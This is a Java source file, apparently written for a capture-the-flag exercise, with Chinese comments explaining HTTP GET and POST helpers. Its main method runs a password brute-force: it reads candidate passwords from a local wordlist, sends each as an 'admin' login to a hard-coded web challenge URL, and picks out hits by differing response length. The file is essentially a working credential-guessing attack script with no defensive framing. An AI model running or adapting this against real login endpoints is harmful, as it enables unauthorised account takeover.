package com.ctfTest;

import java.io.*;
import java.net.*;

public class ServletTest {
	// public void testPost() throws ClientProtocolException, IOException{
	// HttpClient httpclient = new DefaultHttpClient();
	// HttpPost httpost = new HttpPost(loginUrl);
	// List <NameValuePair> nvp = new ArrayList<NameValuePair>();
	// nvp.add(new BasicNameValuePair("username", username));
	// nvp.add(new BasicNameValuePair("password", password));
	// String sCharSet = "GB2312";
	// httpost.setEntity(new UrlEncodedFormEntity(nvp,sCharSet));
	// HttpResponse response = httpclient.execute(httpost);
	// if(response!=null)
	// {
	// System.out.println(response.getFirstHeader("Location").getValue());
	// System.out.println(response.getStatusLine().getStatusCode());
	// }
	// httpost.abort();
	// }

	static String sendGet(String url) { // 定义一个字符串用来存储网页内容
		String result = "";
		// 定义一个缓冲字符输入流
		BufferedReader in = null;
		try {
			// 将string转成url对象
			URL realUrl = new URL(url);
			// 初始化一个链接到那个url的连接
			URLConnection connection = realUrl.openConnection();
			// 开始实际的连接
			connection.connect();
			// 初始化 BufferedReader输入流来读取URL的响应
			in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			// 用来临时存储抓取到的每一行的数据
			String line;
			while ((line = in.readLine()) != null) {
				// 遍历抓取到的每一行并将其存储到result里面
				result += line;
			}
		} catch (Exception e) {
			System.out.println("发送GET请求出现异常！" + e);
			e.printStackTrace();
		} // 使用finally来关闭输入流
		finally {
			try {
				if (in != null) {
					in.close();
				}
			} catch (Exception e2) {
				e2.printStackTrace();
			}
		}
		return result;
	}

	public static void readContentFromPost() throws IOException {
		// Post请求的url，与get不同的是不需要带参数
		URL postUrl = new URL("http://www.xxxxxxx.com");
		// 打开连接
		HttpURLConnection connection = (HttpURLConnection) postUrl.openConnection();
		// 设置是否向connection输出，因为这个是post请求，参数要放在
		// http正文内，因此需要设为true
		connection.setDoOutput(true);
		// Read from the connection. Default is true.
		connection.setDoInput(true);
		// 默认是 GET方式
		connection.setRequestMethod("POST");
		// Post 请求不能使用缓存
		connection.setUseCaches(false);
		// 设置本次连接是否自动重定向
		connection.setInstanceFollowRedirects(true);
		// 配置本次连接的Content-type，配置为application/x-www-form-urlencoded的
		// 意思是正文是urlencoded编码过的form参数
		connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		// 连接，从postUrl.openConnection()至此的配置必须要在connect之前完成，
		// 要注意的是connection.getOutputStream会隐含的进行connect。
		connection.connect();
		DataOutputStream out = new DataOutputStream(connection.getOutputStream());
		// 正文，正文内容其实跟get的URL中 '? '后的参数字符串一致
		String content = "字段名=" + URLEncoder.encode("字符串值", "编码");
		// DataOutputStream.writeBytes将字符串中的16位的unicode字符以8位的字符形式写到流里面
		out.writeBytes(content);
		// 流用完记得关
		out.flush();
		out.close();
		// 获取响应
		BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		String line;
		while ((line = reader.readLine()) != null) {
			System.out.println(line);
		}
		reader.close();
		// 该干的都干完了,记得把连接断了
		connection.disconnect();
	}

	public static void main(String[] args) {
		String url = "http://39.107.92.230/web/web5/index.php";
		String result = sendGet(url), temp;
		int num = 0;
		try {
			BufferedReader rin = new BufferedReader(new FileReader(new File("pswd")));
			// 定义即将访问的链接
			while ((temp = rin.readLine()) != null) {
				temp = sendGet(url + "?username=admin&password=" + temp.trim());
				if (temp.length() != result.length())
					System.out.println(temp);
				else
					System.out.println(++num);
			}
			rin.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}